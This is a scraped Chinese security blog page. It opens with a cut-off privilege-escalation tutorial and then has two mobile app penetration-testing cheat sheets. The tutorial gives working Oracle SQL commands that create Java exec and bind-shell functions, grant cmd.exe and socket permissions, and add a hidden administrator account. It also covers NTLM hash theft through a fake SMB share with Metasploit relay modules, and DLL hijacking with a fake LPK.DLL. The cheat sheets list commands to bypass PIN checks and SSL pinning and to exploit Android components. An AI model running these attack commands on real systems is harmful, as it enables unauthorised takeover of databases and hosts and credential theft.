/</span><br></pre></td></tr></table></figure>
<p>Java 已创建。</p>
<figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; create <span class="keyword">or</span> replace <span class="function"><span class="keyword">function</span> <span class="title">PAEQ_LISTFOLDER</span><span class="params">(str varchar2)</span> <span class="title">return</span> <span class="title">varchar2</span></span><br><span class="line">2 <span class="title">as</span> <span class="title">language</span> <span class="title">java</span> <span class="title">name</span> ‘<span class="title">PAEQ</span>.<span class="title">listFolder</span><span class="params">(java.lang.<span class="keyword">String</span>)</span> <span class="title">return</span> <span class="title">java</span>.<span class="title">lang</span>.<span class="title">S</span></span><br><span class="line"><span class="title">tring</span>’;</span></span><br><span class="line"><span class="number">3</span> /</span><br></pre></td></tr></table></figure>
<p>函数已创建。</p>
<figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; create <span class="keyword">or</span> replace <span class="function"><span class="keyword">function</span> <span class="title">PAEQ_SAVEFILE</span><span class="params">(p varchar2,v varchar2)</span> <span class="title">return</span> <span class="title">varc</span></span><br><span class="line"><span class="title">har2</span></span><br><span class="line">2 <span class="title">as</span> <span class="title">language</span> <span class="title">java</span> <span class="title">name</span> ‘<span class="title">PAEQ</span>.<span class="title">saveFile</span><span class="params">(java.lang.<span class="keyword">String</span>,java.lang.<span class="keyword">String</span>)</span> <span class="title">ret</span></span><br><span class="line"><span class="title">urn</span> <span class="title">java</span>.<span class="title">lang</span>.<span class="title">String</span>’;</span></span><br><span class="line"><span class="number">3</span> /</span><br></pre></td></tr></table></figure>
<p>函数已创建。</p>
<figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; create <span class="keyword">or</span> replace <span class="function"><span class="keyword">function</span> <span class="title">PAEQ_READFILE</span><span class="params">(p varchar2,c varchar2)</span> <span class="title">return</span> <span class="title">varc</span></span><br><span class="line"><span class="title">har2</span></span><br><span class="line">2 <span class="title">as</span> <span class="title">language</span> <span class="title">java</span> <span class="title">name</span> ‘<span class="title">PAEQ</span>.<span class="title">readFile</span><span class="params">(java.lang.<span class="keyword">String</span>,java.lang.<span class="keyword">String</span>)</span> <span class="title">ret</span></span><br><span class="line"><span class="title">urn</span> <span class="title">java</span>.<span class="title">lang</span>.<span class="title">String</span>’;</span></span><br><span class="line"><span class="number">3</span> /</span><br></pre></td></tr></table></figure>
<p>函数已创建。</p>
<figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; create <span class="keyword">or</span> replace <span class="function"><span class="keyword">function</span> <span class="title">PAEQ_EXECFILE</span><span class="params">(fp varchar2,c varchar2)</span> <span class="title">return</span> <span class="title">var</span></span><br><span class="line"><span class="title">char2</span></span><br><span class="line">2 <span class="title">as</span> <span class="title">language</span> <span class="title">java</span> <span class="title">name</span> ‘<span class="title">PAEQ</span>.<span class="title">execFile</span><span class="params">(java.lang.<span class="keyword">String</span>,java.lang.<span class="keyword">String</span>)</span> <span class="title">ret</span></span><br><span class="line"><span class="title">urn</span> <span class="title">java</span>.<span class="title">lang</span>.<span class="title">String</span>’;</span></span><br><span class="line"><span class="number">3</span> /</span><br></pre></td></tr></table></figure>
<p>函数已创建。</p>
<figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; create or replace <span class="function"><span class="keyword">function</span></span> PAEQ_BINDSHELL(port <span class="keyword">number</span>) <span class="keyword">return</span> varchar2</span><br><span class="line"><span class="number">2</span> as language java <span class="keyword">name</span> ‘PAEQ.bindShell(<span class="built_in">int</span>) <span class="keyword">return</span> java.lang.String’;/</span><br><span class="line"><span class="number">3</span> /</span><br></pre></td></tr></table></figure>
<p>警告: 创建的函数带有编译错误。什么意思？多了一个 / ？</p>
<figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; create or replace <span class="function"><span class="keyword">function</span></span> PAEQ_BINDSHELL(port <span class="keyword">number</span>) <span class="keyword">return</span> varchar2</span><br><span class="line"><span class="number">2</span> as language java <span class="keyword">name</span> ‘PAEQ.bindShell(<span class="built_in">int</span>) <span class="keyword">return</span> java.lang.String’;</span><br><span class="line"><span class="number">3</span> /</span><br></pre></td></tr></table></figure>
<p>函数已创建。</p>
<p>2.赋予权限</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; begin</span><br><span class="line"><span class="number">2</span> Dbms_Java.Grant_Permission(‘YSREAL’,’java.io.FilePermission’,’c:/WINDOWS/sy</span><br><span class="line">stem32/cmd.exe’,’read,write,execute,<span class="keyword">delete</span>’);</span><br><span class="line"><span class="number">3</span> Dbms_Java.Grant_Permission(‘YSREAL’,’java.lang.RuntimePermission’,’*’,’writ</span><br><span class="line">eFileDescriptor’);</span><br><span class="line"><span class="number">4</span> Dbms_Java.grant_permission(‘YSREAL’,’java.net.SocketPermission’,’*:*’,’acce</span><br><span class="line">pt,connect,listen,resolve’);</span><br><span class="line"><span class="number">5</span> end;</span><br><span class="line"><span class="number">6</span> /</span><br></pre></td></tr></table></figure>
<p>PL/SQL 过程已成功完成。</p>
<p>3.添加用户到管理员组</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="constant">SQL</span>&gt; select <span class="constant">PAEQ_EXECFILE</span>(‘<span class="constant">C</span><span class="symbol">:/WINDOWS/system32/cmd</span>.exe /c net user ceshi ceshi /</span><br><span class="line">add’,’<span class="constant">GBK</span>’) from dual;</span><br><span class="line"></span><br><span class="line"><span class="constant">PAEQ_EXECFILE</span>(‘<span class="constant">C</span><span class="symbol">:/WINDOWS/SYSTEM32/CMD</span>.<span class="constant">EXE</span>/<span class="constant">CNETUSERCESHICESHI</span>/<span class="constant">ADD</span>’,’<span class="constant">GBK</span>’)</span><br></pre></td></tr></table></figure>
<p>——————————————————————————–</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="constant">SQL</span>&gt; select <span class="constant">PAEQ_EXECFILE</span>(‘<span class="constant">C</span><span class="symbol">:/WINDOWS/system32/cmd</span>.exe /c net localgroup <span class="constant">Adminis</span></span><br><span class="line">trators ceshi /add’,’<span class="constant">GBK</span>’) from dual;</span><br><span class="line"></span><br><span class="line"><span class="constant">PAEQ_EXECFILE</span>(‘<span class="constant">C</span><span class="symbol">:/WINDOWS/SYSTEM32/CMD</span>.<span class="constant">EXE</span>/<span class="constant">CNETLOCALGROUPADMINISTRATORSCESHI</span>/<span class="constant">ADD</span></span><br></pre></td></tr></table></figure>
<p>——————————————————————————–</p>
<p>提权完成。</p>
<p>方法 2：<br>原理：<br>从数据库控制台初始化到远程 SMB 共享的连接，这样可以通过我们伪造的SMB服务器获得授权用户的 NTLM 的挑战回应值串。</p>
<p>方法：<br>1.创建一个特殊的表：<br>SQL&gt; CREATE TABLE files (id NUMBER PRIMARY KEY, path VARCHAR(255) UNIQUE,<br>ot_format VARCHAR(6));<br>2.把我们的 SMB 共享的网络路径插到表中的路径字段中去；<br>SQL&gt; INSERT INTO files VALUES (1, ‘\172.16.0.235\SHARE’, NULL);<br>3.然后创建一个 ctxsys.context 指针到 ot_format 字段中去：<br>SQL&gt; CREATE INDEX file_index ON files(path) INDEXTYPE IS ctxsys.context<br>PARAMETERS (’datastore ctxsys.file_datastore format column ot_format’);<br>4.在创建这个指针的时候，如果高权限 RDBMS 进程正在运行，RDBMS 进程会初始化到我们的 SMB 共享服务器的连接，并且尝试用可信用户授权；<br>5.所以我们在 172.16.0.235 上刚刚开始运行伪造 SMB 服务器的时候，我们会得到密码的 HALFLM 挑战哈希值，所以我们可以用彩虹表或是暴露破解解密即可得到管理员密码。<br>6.破解不了，就用 SMB_relay，转发强化过程到服务器并且以管理员授权，<br>7.运行 metasploit 的 smb_relay 模块，设置本地 IP、port.etc。<br>8.配置 ora_ntlm_stealer 模块，IP与 smb_relay 一样，运行来产生 SQL 攻击代码，默认代码路径：./data/exploits/msf.sql。<br>9.用普通账户链接数据库，然后执行用 ora_ntlm_stealer 产生的 SQL 语句；<br>10.然后在 smb_relay 模块看到就会有其他用户来链接我们的伪造服务器，在特权 RDBMS 进程在运行的时候，用户的连接被初始化，</p>
<h4 id="LPK__u52AB_u6301_u63D0_u6743_uFF1A"><a href="#LPK__u52AB_u6301_u63D0_u6743_uFF1A" class="headerlink" title="LPK 劫持提权："></a>LPK 劫持提权：</h4><p>原理：<br>在程序运行时，操作系统加载程序首先从应用程序目录中加载模块，这样就有机会让应用程序去加载我们的 DLL。如果这个 DLL 和系统目录下的某个 DLL 同名，导出表也相同， 功能就是加载系统目录下的那个 DLL，并且将导出表转发到那个系统目录下的 DLL。这时 DLL 劫持就发生了。可以看出，构造一个符合上面要求的 DLL， 再将其放在可执行文件的目录即可轻松实现 DLL 劫持了。</p>
<p>方法：<br>通过编程来实现一个 LPK.DLL 文件，它与系统目录下的 LPK.DLL 导出表相同，并能加载系统目录下的 LPK.DLL，并且能将导出表转发到真实的 LPK.DLL。 可以看出我们要实现的这个 DLL 需求如下：<br>1、构造一个与系统目录下 LPK.DLL 一样的导出表；<br>2、加载系统目录下的 LPK.DLL；<br>3、将导出函数转发到系统目录下的 LPK.DLL 上；<br>4、在初始化函数中加入我们要执行的代码。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2016/04/18/tiquan/" data-id="cin5pv33s0005hcfwy5abzkqx" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-移动应用渗透测试备忘单(二)" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2016/03/20/移动应用渗透测试备忘单(二)/" class="article-date">
  <time datetime="2016-03-20T06:45:05.000Z" itemprop="datePublished">2016-03-20</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2016/03/20/移动应用渗透测试备忘单(二)/">移动应用渗透测试备忘单(二)</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>##移动应用渗透测试备忘单(二)</p>
<p>###iOS应用程序渗透测试</p>
<p>####访问文件系统</p>
<ul>
<li><a href="https://filezilla-project.org/download.php?show_all=1" target="_blank" rel="external">FileZilla</a> - 它支持FTP、SFTP和FTP(FTP / SSL / TLS)。</li>
<li><a href="https://cyberduck.io/" target="_blank" rel="external">Cyberduck</a> - FTP、SFTP WebDAV,S3,Azure &amp; openstack SWIFT 浏览器mac和windows下。</li>
<li><a href="https://code.google.com/p/iphonetunnel-usbmuxconnectbyport/downloads/list" target="_blank" rel="external">itunnel</a> - 使用SSH通过usb接口。</li>
<li><a href="http://www.i-funbox.com/" target="_blank" rel="external">iFunbox</a> - 文件和应用程序管理工具为iphone,ipad和iPod Touch。</li>
</ul>
<h4 id="u9006_u5411_u5DE5_u7A0B_u548C_u9759_u6001_u5206_u6790"><a href="#u9006_u5411_u5DE5_u7A0B_u548C_u9759_u6001_u5206_u6790" class="headerlink" title="逆向工程和静态分析"></a>逆向工程和静态分析</h4><ul>
<li><a href="http://www.unix.com/man-page/osx/1/otool/" target="_blank" rel="external">otool</a> - otool命令显示指定的目标文件或库的一部分。</li>
<li><a href="http://cydia.radare.org/" target="_blank" rel="external">Clutch</a> - 解密bundleID成二进制或指定的应用程序和转储.ipa文件</li>
<li><a href="https://github.com/stefanesser/dumpdecrypted" target="_blank" rel="external">Dumpdecrypted</a> - 转储文件解密mach-o从内存磁盘文件加密的iPhone应用程序。这个工具是必要的安全研究人员能够看看引擎盖下面的加密。<ul>
<li>iPod:~root#DYLD_INSERT_LIBRARIES=dumpdecrypted.dylib /var/mobile/Applications/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx/Scan.app/Scan</li>
</ul>
</li>
<li><a href="http://stevenygard.com/projects/class-dump/" target="_blank" rel="external">class-dump</a> - 一个命令行实用程序用于检查objective - c运行时信息存储在Mach-O文件。</li>
<li><a href="https://github.com/limneos/weak_classdump" target="_blank" rel="external">Weak Classdump</a> - 一个命令行实用程序用于检查objective - c运行时信息存储在Mach-O文件。<ul>
<li>iPod:~ root# cycript -p Skype weak_classdump.cy; cycript -p Skype</li>
<li>#cy weak_classdump_bundle([NSBundle mainBundle],”/tmp/Skype”)</li>
</ul>
</li>
<li>I<a href="https://www.hex-rays.com/products/ida/index.shtml" target="_blank" rel="external">DA Pro</a>  - IDA是一个Windows,Linux或Mac OS X主持多处理器反汇编程序和调试器提供了很多功能.</li>
<li><a href="http://hopperapp.com/" target="_blank" rel="external">HopperApp</a> - Hopper是OS X和Linux的逆向工程工具,可以拆卸,反编译和调试32/64bits Intel Mac、Linux、Windows和iOS的可执行文件。</li>
<li><a href="https://www.veracode.com/iret-ios-reverse-engineering-toolkit" target="_blank" rel="external">iRET</a> - iOS逆向工程工具包是一个工具箱设计自动化的许多常见任务与iOS渗透测试.</li>
</ul>
<p>####动态和运行时分析</p>
<ul>
<li><p><a href="http://www.cycript.org/" target="_blank" rel="external">cycript</a>  Cycript允许开发人员探讨和修改iOS和Mac OS X上运行的应用程序使用一个混合的objective - c + +和JavaScript语法通过交互式控制台功能语法高亮显示和tab补齐。</p>
<ul>
<li>显示当前视图 <ul>
<li>cy#UIApp.keyWindow.rootViewController.topViewController.visibleViewController</li>
</ul>
</li>
<li>得到一个现有的某个类的对象数组<ul>
<li>cy# choose(UIViewController)</li>
</ul>
</li>
<li>列表方法在运行时<ul>
<li>cy# [classname].messages or</li>
<li>cy# function printMethods(className) { var count = new new Type(“I”); var methods = class_copyMethodList(objc_getClass(className), count); var methodsArray = []; for(var i = 0; i &lt; *count; i++) { var method = methods[i]; methodsArray.push({selector:method_getName(method), implementation:method_getImplementation(method)}); } free(methods); free(count); return methodsArray; }</li>
<li>cy# printMethods(“[classname]”)</li>
</ul>
</li>
<li>打印出所有的实例变量<ul>
<li>cy# function tryPrintIvars(a){ var x={}; for(i in a){ try{ x[i] = (a)[i]; } catch(e){} } return x; }</li>
<li>cy# a=#0x15d0db80</li>
<li>cy# tryPrintIvars(a)</li>
</ul>
</li>
<li>操纵通过属性<ul>
<li>cy# [a pinCode]</li>
<li>cy# [a setPinCode: @”1234”]</li>
<li>cy# [a isValidPin]</li>
<li>cy# a-&gt;isa.messages[‘isValidPin’] = function(){return 1;}</li>
</ul>
</li>
</ul>
</li>
<li><p><a href="https://appsec-labs.com/cydia/" target="_blank" rel="external">iNalyzer</a> - 应用安全实验iNalyzer操纵iOS应用程序是一个框架,篡改参数和方法。</p>
</li>
<li><a href="https://github.com/dmayer/idb" target="_blank" rel="external">idb</a> - idb是一个工具来简化为iOS其中一些常见任务和研究。</li>
<li><a href="http://cydia.radare.org/" target="_blank" rel="external">snoop-it</a>  - 一个工具来协助安全评估和动态分析的iOS应用程序。</li>
<li><a href="https://github.com/iSECPartners/Introspy-iOS" target="_blank" rel="external">Introspy-iOS</a>  黑盒测试工具来帮助理解一个iOS应用程序在运行时所做的和协助识别潜在的安全问题</li>
<li><a href="http://cydia.radare.org/" target="_blank" rel="external">gdb</a> - IOS应用程序的执行运行时分析工具。</li>
<li><a href="http://cydia.radare.org/" target="_blank" rel="external">keychaindumper</a> -检查哪些密钥链项可用的工具来攻击者一旦iOS设备已经越狱。</li>
<li><a href="http://securitylearn.net/wp-content/uploads/tools/iOS/BinaryCookieReader.py" target="_blank" rel="external">BinaryCookieReader</a>  -一个工具来转储所有二进制的cookie .binarycookies文件</li>
</ul>
<h4 id="u7F51_u7EDC_u5206_u6790_u548C_u670D_u52A1_u5668_u7AEF_u6D4B_u8BD5"><a href="#u7F51_u7EDC_u5206_u6790_u548C_u670D_u52A1_u5668_u7AEF_u6D4B_u8BD5" class="headerlink" title="网络分析和服务器端测试"></a>网络分析和服务器端测试</h4><p><a href="www.contextis.com/services/research/canape/">Canape</a>  - 网络测试工具任意协议<br><a href="https://intrepidusgroup.com/insight/mallory/" target="_blank" rel="external">Mallory</a> - 一个中间人工具，在移动设备上使用监视和操作和应用程序。<br><a href="https://portswigger.net/burp/download.html" target="_blank" rel="external">Burp Suite</a> - burp 一个集成的平台进行安全测试的应用程序。<br><a href="http://www.charlesproxy.com/" target="_blank" rel="external">Charles Proxy</a> - HTTP代理/ HTTP监控/反向代理,使开发人员能够查看所有的HTTP / HTTPS和SSL通信和互联网之间的机器。</p>
<h4 id="u7ED5_u8FC7_u6839_u68C0_u6D4B_u548CSSL"><a href="#u7ED5_u8FC7_u6839_u68C0_u6D4B_u548CSSL" class="headerlink" title="绕过根检测和SSL"></a>绕过根检测和SSL</h4><p><a href="https://github.com/nabla-c0d3/ssl-kill-switch2" target="_blank" rel="external">SSL Kill Switch 2</a> - 黑盒测试工具禁用SSL证书验证,包括证书,在iOS和mac OS X应用程序。<br><a href="https://github.com/intrepidusgroup/trustme" target="_blank" rel="external">iOS TrustMe</a>  - 禁用证书信任iOS设备上检查。<br><a href="http://apt.modmyi.com/" target="_blank" rel="external">Xcon</a>  - 绕过越狱的工具检测。<br><a href="http://cydia.saurik.com/package/kr.typostudio.tsprotector8/" target="_blank" rel="external">tsProtector</a>  一个工具绕过越狱检测。</p>
<h4 id="u5B89_u5168_u5E93"><a href="#u5B89_u5168_u5E93" class="headerlink" title="安全库"></a>安全库</h4><p><a href="https://www.owasp.org/images/9/9a/Pubkey-pin-ios.zip" target="_blank" rel="external">PublicKey Pinning</a> - iOS将通过执行NSURL Connection Delegate。委托必须实现连接；委托必须调用交会信任评估执行惯例X509检查。</p>
<h5 id="u539F_u6587_u51FA_u5904"><a href="#u539F_u6587_u51FA_u5904" class="headerlink" title="原文出处"></a>原文出处</h5><ul>
<li><a href="https://www.peerlyst.com/posts/mobile-application-penetration-testing-cheat-sheet" target="_blank" rel="external">https://www.peerlyst.com/posts/mobile-application-penetration-testing-cheat-sheet</a></li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2016/03/20/移动应用渗透测试备忘单(二)/" data-id="cin5pv33a0001hcfw2wxdl0kg" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-移动应用渗透测试备忘单(一)" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2016/03/02/移动应用渗透测试备忘单(一)/" class="article-date">
  <time datetime="2016-03-02T06:45:05.000Z" itemprop="datePublished">2016-03-02</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2016/03/02/移动应用渗透测试备忘单(一)/">移动应用渗透测试备忘单(一)</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>##移动应用渗透测试备忘单(一)</p>
<h3 id="Android_u5E94_u7528_u7A0B_u5E8F_u6E17_u900F_u6D4B_u8BD5"><a href="#Android_u5E94_u7528_u7A0B_u5E8F_u6E17_u900F_u6D4B_u8BD5" class="headerlink" title="Android应用程序渗透测试"></a>Android应用程序渗透测试</h3><p>####安卓测试发行版<br><a href="https://manifestsecurity.com/appie" target="_blank" rel="external">Appid</a> -便携式软件包为android和一个很棒的替代现有的虚拟机<br><a href="https://androidtamer.com/" target="_blank" rel="external">Android Tamer android</a>-一个虚拟的/android生活平台安全专家。<br><a href="https://github.com/sh4hin/Androl4b" target="_blank" rel="external">Androl4b</a> -评估Android应用程序的虚拟机,逆向工程和恶意软件分析<br><a href="https://appsec-labs.com/AppUse/" target="_blank" rel="external">AppUse</a>-AppUse是一个VM(虚拟机)由AppSec实验室。<br><a href="https://sourceforge.net/projects/mobisec/" target="_blank" rel="external">Mobisec</a>-移动安全测试现场环境。<br><a href="https://santoku-linux.com/" target="_blank" rel="external">Santoku</a>  是一个操作系统,可以运行虚拟机作为一个独立的操作系统。<br><a href="https://github.com/oguzhantopgul/Vezir-Project" target="_blank" rel="external">Vezir Project</a> -移动应用程序和恶意软件分析环境</p>
<p>#####一体化的移动安全框架<br><a href="https://github.com/ajinabraham/Mobile-Security-Framework-MobSF" target="_blank" rel="external">Mobile Security Framework - MobSF</a> 移动安全框架是一个聪明、一体化的开源的移动应用程序(Android / iOS)自动化pen-testing框架执行静态和动态分析的能力。</p>
<pre><code>python manage.py runserver 127.0.0.1:1337
</code></pre><p>####逆向工程和静态分析<br><a href="https://github.com/honeynet/apkinspector/" target="_blank" rel="external">APKInspector</a>  APKInspector 是一个强大的Android应用程序GUI工具工具</p>
<ul>
<li><p>拆卸Android的apk文件</p>
<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apktool d <span class="string">[apk]</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>重建解码的APK / JAR与证书签名</p>
<figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">* apktool b(修改文件夹)</span><br><span class="line">* keytool -genkey -v -keystore keys/test.keystore -alias Test -keyalg RSA -keysize 1024 -sigalg SHA1withRSA -validity 10000</span><br><span class="line">	 -<span class="ruby">genkey 产生一个键值对（公钥和私钥）</span><br><span class="line"></span>	 -<span class="ruby">v 允许动作输出</span><br><span class="line"></span>	 -<span class="ruby"><span class="keyword">alias</span> 后面跟的是别名这里是<span class="constant">Test</span></span><br><span class="line"></span>	 -<span class="ruby">keyalg 是加密方式这里是<span class="constant">RSA</span></span><br><span class="line"></span>	 -<span class="ruby">keysize 产生键的长度。如果不支持，keytool用默认值<span class="number">1024</span> bits</span><br><span class="line"></span>	 -<span class="ruby">sigalg 签名算法<span class="constant">SHA1withRSA</span></span><br><span class="line"></span>	 -<span class="ruby">validity 是有效期这里是<span class="number">10000</span></span><br><span class="line"></span>	 -<span class="ruby">keystore 就是要生成的keystore的名称这里是test.keystore    </span><br><span class="line"></span>* jarsigner -keystore keys/test.keystore dist/test.apk -sigalg SHA1withRSA -digestalg SHA1 Test</span><br><span class="line">	-<span class="ruby"><span class="symbol">keystore:</span> keystore的名称</span><br><span class="line"></span>	-<span class="ruby">sigalg 签名算法，用 <span class="constant">SHA1withRSA</span>.</span><br><span class="line"></span>	-<span class="ruby">digestalg 消息摘要算法，用 <span class="constant">SHA1</span>.</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><a href="https://github.com/appium/sign" target="_blank" rel="external">Sign</a> Sign.jar自动迹象的apk安卓测试证书。</p>
</li>
<li><a href="https://github.com/skylot/jadx" target="_blank" rel="external">Jadx</a> Java敏捷编译器:命令行和GUI工具生成Java源代码从Android敏捷和Apk文件</li>
<li><a href="https://github.com/pxb1988/dex2jar" target="_blank" rel="external">Dex2jar</a>转换的工具.dex文件.class文件(压缩jar)<ul>
<li>apk文件转换成jar文件<ul>
<li>Dex2jar [apk 文件] </li>
</ul>
</li>
</ul>
</li>
<li><a href="https://github.com/testwhat/SmaliEx" target="_blank" rel="external">Oatdex</a> 一个转换的工具.oat 文件到 .dex 文件.<ul>
<li>反优化引导类(输出将在“odex”和“dex”文件夹)<ul>
<li>java -jar oat2dex.jar boot [boot.oat 文件]</li>
</ul>
</li>
<li>反优化应用程序<ul>
<li>java -jar oat2dex.jar [app.odex] [从上面boot-class-folder输出]</li>
</ul>
</li>
<li>从oat 到 odex<ul>
<li>java -jar oat2dex.jar odex [oat 文件]</li>
</ul>
</li>
<li>得到odex smali从oat/ odex(与优化操作码)<ul>
<li>java -jar oat2dex.jar smali [oat/odex 文件]</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><a href="http://jd.benow.ca/" target="_blank" rel="external">JD-Gui</a> 反编译和分析Java代码的工具<br><a href="findbugs.sourceforge.net">FindBugs</a> + <a href="findbugs.sourceforge.net">FindSecurityBugs</a> FindSecurityBugs FindBugs是一个扩展,包括Java应用程序的安全规则。</p>
<p><a href="https://github.com/linkedin/qark" target="_blank" rel="external">Qark</a> 这个工具的目的是寻找几个安全相关的Android应用程序漏洞,在源代码或打包的apk。<br><a href="https://github.com/AndroBugs/AndroBugs_Framework" target="_blank" rel="external">AndroBugs</a> -AndroBugs 是一种有效的Android漏洞扫描器框架,有助于开发人员或黑客在Android应用程序找到潜在的安全漏洞。不需要在Windows上安装。<br><a href="https://github.com/CalebFenton/simplify" target="_blank" rel="external">Simplify</a> android包成Classes.dex反混淆的工具可以使用Dex2jar和JD-GUI提取dex文件的内容。</p>
<ul>
<li>simplify.jar -i [输入smali 文件或者文件夹] -o [输出dex 文件]</li>
</ul>
<p><a href="https://github.com/HamiltonianCycle/ClassNameDeobfuscator" target="_blank" rel="external">ClassNameDeobfuscator</a> 简单的脚本解析通过.smali文件由apktool提取的源代码注释行。</p>
<h4 id="u52A8_u6001_u548C_u8FD0_u884C_u65F6_u5206_u6790"><a href="#u52A8_u6001_u548C_u8FD0_u884C_u65F6_u5206_u6790" class="headerlink" title="动态和运行时分析"></a>动态和运行时分析</h4><p><a href="https://github.com/iSECPartners/Introspy-Android" target="_blank" rel="external">Introspy-Android</a>-黑箱工具来帮助理解Android应用程序在运行时所做的和协助识别潜在的安全问题。<br><a href="http://www.cydiasubstrate.com/" target="_blank" rel="external">Cydia Substrate</a> -Cydia Substrate为Android使开发人员能够修改现有软件与底物扩展中注入到目标进程的内存。<br><a href="forum.xda-developers.com/xposed/xposed-installer-versions-changelog-t2714053">Xposed Framework</a> -Xposed框架使您能够在运行时修改系统或应用程序方面和行为,无需修改任何Android应用程序包(apk)或re-flashing。<br><a href="https://github.com/nolanlawson/Catlog" target="_blank" rel="external">CatLog</a>-为Android进行图形记录。<br><a href="https://code.google.com/p/droidbox/" target="_blank" rel="external">Droidbox</a> -DroidBox提供开发Android应用程序的动态分析。<br><a href="https://github.com/marshall/logcat-color" target="_blank" rel="external">logcat-color</a> 丰富多彩和高度可配置的替代adb logcat命令从Android SDK。<br><a href="http://www.frida.re/" target="_blank" rel="external">Frida</a>工具箱使用客户机-服务器模型和允许您将运行的进程不仅在Android上,但同样在iOS,Windows和Mac。<br><a href="https://github.com/swdunlop/AndBug" target="_blank" rel="external">AndBug</a> AndBug调试器针对Android平台的Dalvik虚拟机用于反向工程师和开发人员。<br><a href="https://www.mwrinfosecurity.com/products/drozer/" target="_blank" rel="external">Drozer</a> drozer允许您搜索应用程序的安全漏洞和设备通过假设一个应用程序的作用和交互Dalvik VM,其他应用程序的IPC端点和底层操作系统。</p>
<ul>
<li>开始一个会话<ul>
<li>adb forward tcp:31415 tcp:31415</li>
<li>Drozer console connect</li>
</ul>
</li>
<li>检索包信息<ul>
<li>run app.package.list -f [app 名称]</li>
<li>run app.package.info -a [包名]</li>
</ul>
</li>
<li>确定攻击表面<ul>
<li>run app.package.attacksurface [包名]</li>
</ul>
</li>
<li>利用活动<ul>
<li>run app.Activity.info -a [包名] -u</li>
<li>run app.Activity.start –component [包名] [组件名]</li>
</ul>
</li>
<li>利用内容提供商<ul>
<li>run app.provider.info -a [包名]</li>
<li>run scanner.provider.finduris -a [包名]</li>
<li>run app.provider.query [uri]</li>
<li>run app.provider.update [uri] –selection [条件] [选择参数] [列] [数据]</li>
<li>run scanner.provider.sqltables -a [包名]</li>
<li>run scanner.provider.Injection -a [包名]</li>
<li>run scanner.provider.traversal -a [包名]</li>
</ul>
</li>
<li>利用广播接收器<ul>
<li>run app.broadcast.info -a [包名]</li>
<li>run app.broadcast.send –component [包名] [组件名] –extra [type] [key] [value]</li>
<li>run app.broadcast.sniff –action [作用]</li>
</ul>
</li>
<li>利用服务<ul>
<li>run app.service.info -a [包名]</li>
<li>run app.service.start –action [action] –component [包名] [组件名]</li>
<li>run app.service.send [包名] [组件名] –msg [做用] [函数1] [函数2] –extra [类型] [key] [价值]–bundle-as-obj</li>
</ul>
</li>
</ul>
<h4 id="u7F51_u7EDC_u5206_u6790_u548C_u670D_u52A1_u5668_u7AEF_u6D4B_u8BD5"><a href="#u7F51_u7EDC_u5206_u6790_u548C_u670D_u52A1_u5668_u7AEF_u6D4B_u8BD5" class="headerlink" title="网络分析和服务器端测试"></a>网络分析和服务器端测试</h4><p><a href="http://www.androidtcpdump.com/" target="_blank" rel="external">Tcpdump</a>  -命令行数据包捕获工具。<br><a href="https://www.wireshark.org/download.html" target="_blank" rel="external">Wireshark</a> -一个开源包分析器。</p>
<ul>
<li>现场实时数据包捕获<ul>
<li>adb Shell “tcpdump -s 0 -w - | nc -l -p 4444?</li>
